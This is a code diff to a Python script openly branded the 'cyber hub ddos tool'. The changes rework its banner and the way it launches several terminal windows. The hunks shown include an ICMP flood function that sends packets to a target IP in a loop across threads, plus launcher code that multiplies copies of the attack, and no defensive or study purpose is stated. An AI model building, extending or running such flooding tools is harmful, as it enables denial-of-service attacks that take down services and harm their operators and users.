@@ -5,25 +5,16 @@ import time
 import os
 import platform
 import subprocess
-import pyfiglet
+from custom_terminal import set_terminal_title, set_terminal_color_scheme, clear_terminal
 
 # Create ASCII art for 'C H D T'
+import pyfiglet
+
 ascii_banner = pyfiglet.figlet_format("C H D T")
-
-# Define the simple text 'cyber hub ddos tool'
 simple_text = "cyber hub ddos tool"
-
-# Define separator
 separator = '-' * max(len(ascii_banner.split('\n')[0]), len(simple_text))
-
-# Combine everything with separator
 output = f"{separator}\n{ascii_banner}\n{separator}\n{simple_text}"
-
 print(output)
-
-# Print separator again
-separator = '-' * max(len(ascii_banner.split('\n')[0]), len(simple_text))
-print(separator)
 
 # Calculate checksum for the ICMP packet
 def checksum(source_string):
@@ -67,7 +58,7 @@ def flood_icmp(target_ip, thread_id):
             s.sendto(packet, (target_ip, 1))  # Send packet to the target
             sent_count += 1
 
-            # Print every 100 packets to avoid too much output
+            # Print a success message for every sent packet (can slow down flooding)
             if sent_count % 100 == 0:
                 print(f"Thread {thread_id} successfully sent {sent_count} packets.")
 
@@ -87,34 +78,21 @@ def resolve_domain(domain):
 
 # Launch multiple instances of the script in new windows
 def launch_multiple_instances(num_windows, target_ip, num_threads):
-    terminal_cmd = None
-
-    # Determine which terminal to use based on availability
-    if platform.system() == 'Linux':
-        # Try gnome-terminal, xterm, and lxterminal as fallback options
-        for terminal in ['gnome-terminal', 'xterm', 'lxterminal', 'konsole']:
-            if subprocess.call(['which', terminal], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
-                terminal_cmd = terminal
-                break
-        if not terminal_cmd:
-            print("Error: No suitable terminal found. Please install gnome-terminal, xterm, or another terminal.")
-            return
-        command = f"{terminal_cmd} -- bash -c 'python3 {__file__} {target_ip} {num_threads}'"
-
-    elif platform.system() == 'Darwin':  # macOS
-        command = f"open -a Terminal python3 {__file__} {target_ip} {num_threads}"
-
-    elif platform.system() == 'Windows':
-        command = f"start cmd /k python {__file__} {target_ip} {num_threads}"
-
-    # Launch the instances
     for i in range(num_windows):
+        if platform.system() in ['Linux', 'Darwin']:  # Linux/macOS
+            command = f"xterm -e 'python3 {__file__} {target_ip} {num_threads}'"  # Use xterm instead of gnome-terminal
+        elif platform.system() == 'Windows':
+            command = f"start cmd /k python {__file__} {target_ip} {num_threads}"  # Open new cmd window on Windows
+
         subprocess.Popen(command, shell=True)
         time.sleep(1)  # Wait 1 second between launching windows to avoid overload
 
-
 # Main function to handle user input and start the attack
 def main():
+    clear_terminal()
+    set_terminal_title("Cyber Hub DDoS Tool")
+    set_terminal_color_scheme()
+
     # Check if launched with arguments (target_ip and num_threads)
     if len(os.sys.argv) > 2:
         target_ip = os.sys.argv[1]
